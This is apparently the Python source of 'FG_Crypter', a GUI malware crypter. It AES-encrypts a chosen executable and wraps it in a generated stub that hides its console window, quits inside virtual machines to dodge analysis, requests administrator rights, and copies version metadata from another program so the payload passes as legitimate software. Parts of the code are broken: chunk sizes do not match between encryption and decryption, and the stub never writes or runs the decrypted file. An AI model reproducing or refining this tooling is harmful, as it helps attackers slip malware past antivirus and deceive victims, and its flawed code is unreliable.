from customtkinter import *
from tkinter import messagebox
import os
import platform
import stat
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import subprocess
import threading
import PyInstaller.__main__
from PIL import Image, ImageTk
import win32api
from pyinstaller_versionfile import create_versionfile
import webbrowser

# Global variables for key and IV
key = None
iv = None

def generate_random_key(key_size):
    return os.urandom(key_size)

def generate_random_iv():
    return os.urandom(16)

def encrypt_file():
    global key, iv
    key = generate_random_key(32)
    iv = generate_random_iv()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(input_file_var.get(), 'rb') as f_in, open(output_file_var.get(), 'wb') as f_out:
        f_out.write(iv)
        while True:
            chunk = f_in.read(64)
            if len(chunk) == 0:
                break
            elif len(chunk) % 64 != 0:
                chunk = pad(chunk, 64)
            encrypted_chunk = cipher.encrypt(chunk)
            f_out.write(encrypted_chunk)
    messagebox.showinfo("Encryption", "Encryption completed successfully.")
    display_encryption_info()

def display_encryption_info():
    messagebox.showinfo("Encryption Info", "Encryption completed successfully.\n"
                                           "Encryption Key: " + key.hex() + "\n"
                                           "Encryption IV: " + iv.hex())

def decrypt_file():
    key_input = key_input_entry.get()
    key = bytes.fromhex(key_input)
    iv_input = iv_input_entry.get()
    iv = bytes.fromhex(iv_input)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(input_file_var.get(), 'rb') as f_in, open(output_file_var.get(), 'wb') as f_out:
        iv = f_in.read(16)  # Read the IV from the input file
        while True:
            encrypted_chunk = f_in.read(32)
            if len(encrypted_chunk) == 0:
                break
            decrypted_chunk = cipher.decrypt(encrypted_chunk)
            f_out.write(decrypted_chunk)
    messagebox.showinfo("Decryption", "Decryption completed successfully.")

def set_execution_permissions():
    if platform.system() == 'Linux':
        os.chmod(output_file_var.get(), stat.S_IXUSR)
    elif platform.system() == 'Windows':
        renamed_file = output_file_var.get() + '.exe'
        os.rename(output_file_var.get(), renamed_file)
    else:
        messagebox.showwarning("Unsupported Platform", "Execution permissions not set due to unsupported platform.")

def create_stub():
    with open(output_file_var.get()+'.exe', 'rb') as f:
        binary_data = f.read()

    with open('stub.py', 'w') as python_file:
        python_file.write(f"""import ctypes
h_console = ctypes.windll.kernel32.GetConsoleWindow()
ctypes.windll.user32.ShowWindow(h_console, 0)
from Crypto.Cipher import AES
import subprocess
import os
import sys
import platform
import psutil

def check_vm():
    # Check for common virtualization-related artifacts

    # Check if the machine's hostname contains common VM-related strings
    hostname = platform.node().lower()
    vm_strings = ["virtual", "vmware", "vbox", "qemu", "xen"]
    for vm_string in vm_strings:
        if vm_string in hostname:
            return True

    # Check for known virtualization software processes
    virtualization_processes = ["vmtoolsd.exe", "vboxservice.exe", "qemu-ga.exe"]
    for process in psutil.process_iter(attrs=['name']):
        if process.info['name'].lower() in virtualization_processes:
            return True

    # Check if the CPU vendor ID contains common VM-related strings
    cpu_vendor_id = platform.processor().lower()
    cpu_vm_strings = ["kvm", "vmware", "virtualbox"]
    for vm_string in cpu_vm_strings:
        if vm_string in cpu_vendor_id:
            return True

    # Check if it's running inside a virtualized environment
    if os.path.exists('/sys/hypervisor/uuid') or os.path.exists('/proc/scsi/scsi'):
        return True

    return False

if check_vm():
    quit()

# Get key and IV from user input
key = '{key.hex()}'
key = bytes.fromhex(key)
iv = '{iv.hex()}'
iv = bytes.fromhex(iv)

cipher = AES.new(key, AES.MODE_CBC, iv)

input_file = f'{output_file_var.get()}.exe'
output_file = 'scantime.exe'

file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), input_file)
ofile_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), output_file)

with open(file_path, 'rb') as f_in, open(ofile_path, 'wb') as f_out:
    iv = f_in.read(16)  # Read the IV from the input file
    while True:
        encrypted_chunk = f_in.read(64)
        if len(encrypted_chunk) == 0:
            break
        decrypted_chunk = cipher.decrypt(encrypted_chunk)
        
sys.exit()
""")

def compile_with_nuitka():

    nuitka_command = (
        f'nuitka --mingw64 --onefile --assume-yes-for-downloads '
        f'--remove-output --include-data-file="{output_file_var.get()}.exe=." '
        f'--output-filename=Crypted "stub.py"'
    )
    subprocess.run(nuitka_command, shell=True)


def compile_with_pyinstaller():
    if check_var.get() == 'on' and check_var_ico.get() == 'on':
        PyInstaller.__main__.run([
            'stub.py',
            '--onefile',
            '--add-data',
            f'{output_file_var.get()}.exe;.',
            '-i',
            f'{icon_file_var.get()}',
            '--version-file',
            'version.txt',
            '--name',
            f'{output_var.get()}',
            '--uac-admin'
        ])
    elif check_var.get() == 'on' and check_var_ico.get() == 'off':
        PyInstaller.__main__.run([
            'stub.py',
            '--onefile',
            '--add-data',
            f'{output_file_var.get()}.exe;.',
            '--version-file',
            'version.txt',
            '--name',
            f'{output_var.get()}',
            '--uac-admin'
        ])
    else:
        PyInstaller.__main__.run([
            'stub.py',
            '--onefile',
            '--add-data',
            f'{output_file_var.get()}.exe;.',
            '--name',
            f'{output_var.get()}',
            '--windowed',
            '--hide-console',
            '--uac-admin'
        ])


def encrypt_button_click():
    create_versionfile(output_file='version.txt'
                       , version=version_var.get()
                       ,company_name=company_var.get()
                       ,file_description=description_var.get()
                       ,internal_name=title_var.get()
                       ,legal_copyright=copyright_var.get()
                       ,original_filename=title_var.get()
                       ,product_name=product_var.get())
    progressbar = CTkProgressBar(build_page_frame, orientation="horizontal",width=400)
    progressbar.configure(mode="indeterminate")
    progressbar.pack(pady=50)
    progressbar.start()
    
    if input_file_var.get() and output_file_var.get():
        encrypt_file()
        set_execution_permissions()
        create_stub()
        
        # Compile with Nuitka
        # compile_with_nuitka(input_file, output_file)

        # Compile with PyInstaller
        compile_with_pyinstaller()
        
        os.remove('stub.py')
        
        messagebox.showinfo("Stub Creation", "Stub creation completed successfully.")
        progressbar.stop()
        progressbar.destroy()

def begin():
    threading.Thread(target=encrypt_button_click).start()

def hide_bg():
    basic_indicate.configure(bg_color='transparent')
    assembly_indicate.configure(bg_color='transparent')
    icon_indicate.configure(bg_color='transparent')
    build_indicate.configure(bg_color='transparent')
    advanced_indicate.configure(bg_color='transparent')

def switch(widget,page):
    hide_bg()
    widget.configure(bg_color='blue')

    for fm in main_frame.winfo_children():
        fm.destroy()

    page()

def basic_page():
    global input_file_entry,output_file_entry
    def choose_input_file():
        input_file = filedialog.askopenfilename(title="Select Input File", filetypes=[("Executables", "*.exe")])
        input_file_entry.delete(0, END)  # Clear the current entry
        input_file_entry.insert(0, input_file)  # Set the selected file in the entry

    def choose_output_file():
        output_file = filedialog.asksaveasfilename(title="Name anything...",)
        output_file_entry.delete(0, END)  # Clear the current entry
        output_file_entry.insert(0, output_file)  # Set the selected file in the entry

    basic_page_frame = CTkFrame(main_frame)
    input_file_entry = CTkEntry(basic_page_frame,width=450,textvariable=input_file_var)
    input_file_entry.pack(pady=50)

    input_file_button = CTkButton(basic_page_frame,text="Choose Input file",command=choose_input_file,width=150, corner_radius=40)
    input_file_button.pack()

    output_file_entry = CTkEntry(basic_page_frame,width=450,textvariable=output_file_var)
    output_file_entry.pack(pady=50)

    output_file_button = CTkButton(basic_page_frame,text="Save as",command=choose_output_file,width=150, corner_radius=40)
    output_file_button.pack()

    output_entry = CTkEntry(basic_page_frame,width=450,textvariable=output_var)
    output_entry.pack(pady=50)

    basic_page_frame.pack(fill=BOTH, expand=True)

def icon_page():
    def choose_icon_file():
        global icon_file_path, icon_path
        icon_path = filedialog.askopenfilename(title="Select Icon", filetypes=[("Icon files", "*.ico")])
        if icon_path:
            input_file_entry.delete(0, END)  # Clear the current entry
            input_file_entry.insert(0, icon_path)  # Set the selected file in the entry
            display_icon(icon_path)
    
    def check():
        if check_var_ico.get() == 'on':
            check_box_ico.configure(text="Enabled")
            input_file_entry.configure(state=NORMAL)
            input_file_button.configure(state=NORMAL)
        else:
            check_box_ico.configure(text="Disabled")
            input_file_entry.configure(state=DISABLED)
            input_file_button.configure(state=DISABLED)

    def display_icon(icon_path):
        icon_image = Image.open(icon_path)
        icon_image = ImageTk.PhotoImage(icon_image)
        display_label.configure(image=icon_image)
        display_label.image = icon_image

    icon_page_frame = CTkFrame(main_frame)

    check_box_ico = CTkCheckBox(icon_page_frame,text="Disabled",variable=check_var_ico,onvalue='on',offvalue='off',command=check)
    check_box_ico.place(x=10,y=10)

    input_file_entry = CTkEntry(icon_page_frame, width=450,textvariable=icon_file_var,state=DISABLED)
    input_file_entry.pack(pady=50)

    input_file_button = CTkButton(icon_page_frame, text="Choose Icon .ico", command=choose_icon_file, width=150, corner_radius=40,state=DISABLED)
    input_file_button.pack()

    display_label = CTkLabel(icon_page_frame,text='')
    display_label.pack(pady=50)

    icon_page_frame.pack(fill=BOTH, expand=True)

    try:
        display_icon(icon_path)
    except:
        ...
    
    if check_var_ico.get() == 'on':
        check_box_ico.configure(text="Enabled")
        input_file_entry.configure(state=NORMAL)
        input_file_button.configure(state=NORMAL)

def assembly_page():
    def choose_clone_file():
        file = filedialog.askopenfilename(title="Select Clone File", filetypes=[("Assembly Files", "*.exe")])

        # Retrieve fixed file information
        fixed_info = win32api.GetFileVersionInfo(file, '\\')
        file_version = "%d.%d.%d.%d" % (
            fixed_info['FileVersionMS'] // 65536,
            fixed_info['FileVersionMS'] % 65536,
            fixed_info['FileVersionLS'] // 65536,
            fixed_info['FileVersionLS'] % 65536
        )

        # Retrieve language and codepage pair
        lang, codepage = win32api.GetFileVersionInfo(file, '\\VarFileInfo\\Translation')[0]

        file_version = "%d.%d.%d.%d" % (
            fixed_info['FileVersionMS'] // 65536,
            fixed_info['FileVersionMS'] % 65536,
            fixed_info['FileVersionLS'] // 65536,
            fixed_info['FileVersionLS'] % 65536
        )

        # Print each piece of information
        version = file_version
        Title = win32api.GetFileVersionInfo(file, '\\StringFileInfo\\%04X%04X\\InternalName' % (lang, codepage))
        product_name = win32api.GetFileVersionInfo(file, '\\StringFileInfo\\%04X%04X\\ProductName' % (lang, codepage))
        Company_name = win32api.GetFileVersionInfo(file, '\\StringFileInfo\\%04X%04X\\CompanyName' % (lang, codepage))
        Legal_copyright = win32api.GetFileVersionInfo(file, '\\StringFileInfo\\%04X%04X\\LegalCopyright' % (lang, codepage))
        Description = win32api.GetFileVersionInfo(file, '\\StringFileInfo\\%04X%04X\\FileDescription' % (lang, codepage))
        Trademark = win32api.GetFileVersionInfo(file, '\\StringFileInfo\\%04X%04X\\LegalTrademarks' % (lang, codepage))

        title_var.set(Title) if Title else title_var.set('')
        product_var.set(product_name) if product_name else product_var.set('')
        description_var.set(Description) if Description else description_var.set('')
        copyright_var.set(Legal_copyright) if Legal_copyright else copyright_var.set('')
        company_var.set(Company_name) if Company_name else company_var.set('')
        trademark_var.set(Trademark) if Trademark else trademark_var.set('')
        version_var.set(version)

    def randomize_assembly():
        messagebox.showinfo("Randomizing", "This feature will be added soon thanks")

    def check():
        if check_var.get() == 'on':
            check_box.configure(text='Enabled')
            title.configure(state="normal")
            product.configure(state="normal")
            description.configure(state="normal")
            copyright.configure(state="normal")
            company.configure(state="normal")
            trademark.configure(state="normal")
            version.configure(state="normal")
            clone_file.configure(state="normal")
            randomize.configure(state="normal")
        else:
            check_box.configure(text='Disabled')
            title.configure(state=DISABLED)
            product.configure(state=DISABLED)
            description.configure(state=DISABLED)
            copyright.configure(state=DISABLED)
            company.configure(state=DISABLED)
            trademark.configure(state=DISABLED)
            version.configure(state=DISABLED)
            clone_file.configure(state=DISABLED)
            randomize.configure(state=DISABLED)

        
    
    assembly_page_frame = CTkFrame(main_frame)

    

    check_box = CTkCheckBox(assembly_page_frame,text="Disabled",variable=check_var,onvalue='on',offvalue='off',command=check)
    check_box.place(x=10,y=10)

    title = CTkEntry(assembly_page_frame,state=DISABLED,width=250,textvariable=title_var)
    title.place(x=50,y=50)
    
    product = CTkEntry(assembly_page_frame,state=DISABLED,width=250,textvariable=product_var)
    product.place(x=350,y=50)

    description = CTkEntry(assembly_page_frame,state=DISABLED,width=250,textvariable=description_var)
    description.place(x=50,y=100)

    copyright = CTkEntry(assembly_page_frame,state=DISABLED,width=250,textvariable=copyright_var)
    copyright.place(x=350,y=100)

    company = CTkEntry(assembly_page_frame,state=DISABLED,width=250,textvariable=company_var)
    company.place(x=50,y=150)

    trademark = CTkEntry(assembly_page_frame,state=DISABLED,width=250,textvariable=trademark_var)
    trademark.place(x=350,y=150)

    version = CTkEntry(assembly_page_frame,textvariable=version_var,width=180)
    version.place(x=50,y=200)

    clone_file = CTkButton(assembly_page_frame,text='Clone File',state=DISABLED,command=choose_clone_file)
    clone_file.place(x=250,y=200)

    randomize = CTkButton(assembly_page_frame,text='Randomize',state=DISABLED,command=randomize_assembly)
    randomize.place(x=400,y=200)

    assembly_page_frame.pack(fill=BOTH, expand=True)

    try:
        if check_var.get() == 'on':
            check_box.configure(text='Enabled')
            title.configure(state="normal")
            product.configure(state="normal")
            description.configure(state="normal")
            copyright.configure(state="normal")
            company.configure(state="normal")
            trademark.configure(state="normal")
            version.configure(state="normal")
            clone_file.configure(state="normal")
            randomize.configure(state="normal")
    except:
        pass

def advanced_page():
    advanced_page_frame = CTkFrame(main_frame)
    label = CTkLabel(advanced_page_frame,text="This feature only for \npremium users \nthanks for understanding\n(just kidding)\ni will add some\nfor free users too",font=("Arial",50))
    label.pack(pady=60)
    advanced_page_frame.pack(fill=BOTH, expand=True)

def build_page():
    global build_page_frame
    def donate_page():
        webbrowser.open_new_tab("https://fg-repacks.site/donate.html")
    build_page_frame = CTkFrame(main_frame)
    build = CTkButton(build_page_frame,text='Compile everything',command=begin,width=200)
    build.pack(pady=100)
    donate = CTkButton(build_page_frame,text='Donate me',command=donate_page)
    donate.place(x=245,y=200)
    build_page_frame.pack(fill=BOTH, expand=True)


set_appearance_mode("System")
app = CTk()

app.geometry("625x625")
app.iconbitmap('icon.ico')
app.title("FG_Crypter")

options_frame = CTkFrame(app)

input_file_var = StringVar(value='write Path to the file u want to encrypt manually')
output_file_var = StringVar(value='write Path to the stub file manually donot add .exe')
icon_file_var = StringVar(value='Path to the icon file')
title_var = StringVar(value='Title')
product_var = StringVar(value='Product')
description_var = StringVar(value='description')
copyright_var = StringVar(value='Copyright')
company_var = StringVar(value='Company')
trademark_var = StringVar(value='TradeMark')
version_var = StringVar(value='0.0.0.0')
check_var = StringVar(value=OFF)
check_var_ico = StringVar(value=OFF)
output_var = StringVar(value='Enter Output file name here dont add .exe')

basic_btn = CTkButton(options_frame,text="Basic",font=("Arial",13), width=125,command=lambda: switch(basic_indicate,basic_page))
basic_btn.place(x=0,y=0)

basic_indicate = CTkLabel(options_frame,text="",bg_color='blue',width=100,height=2)
basic_indicate.place(x=12,y=30)

icon_btn = CTkButton(options_frame,text="Icon",font=("Arial",13), width=125,command=lambda: switch(icon_indicate,icon_page))
icon_btn.place(x=125,y=0)

icon_indicate = CTkLabel(options_frame,text="", width=100,height=2)
icon_indicate.place(x=137,y=30)

Assembly_btn = CTkButton(options_frame,text="Assembly",font=("Arial",13), width=125,command=lambda: switch(assembly_indicate,assembly_page))
Assembly_btn.place(x=250,y=0)

assembly_indicate = CTkLabel(options_frame,text="",width=100,height=2)
assembly_indicate.place(x=262,y=30)

Advanced_btn = CTkButton(options_frame,text="Advanced",font=("Arial",13), width=125,command=lambda: switch(advanced_indicate,advanced_page))
Advanced_btn.place(x=375,y=0)

advanced_indicate = CTkLabel(options_frame,text="",width=100,height=2)
advanced_indicate.place(x=387,y=30)

Build_btn = CTkButton(options_frame,text="Build",font=("Arial",13), width=125,command=lambda: switch(build_indicate,build_page))
Build_btn.place(x=500,y=0)

build_indicate = CTkLabel(options_frame,text="",width=100,height=2)
build_indicate.place(x=512,y=30)
options_frame.pack(pady=5)
options_frame.propagate(False)
options_frame.configure(width=650,height=35)
main_frame = CTkFrame(app)
main_frame.pack(fill=BOTH,expand=True)
basic_page()
app.mainloop()
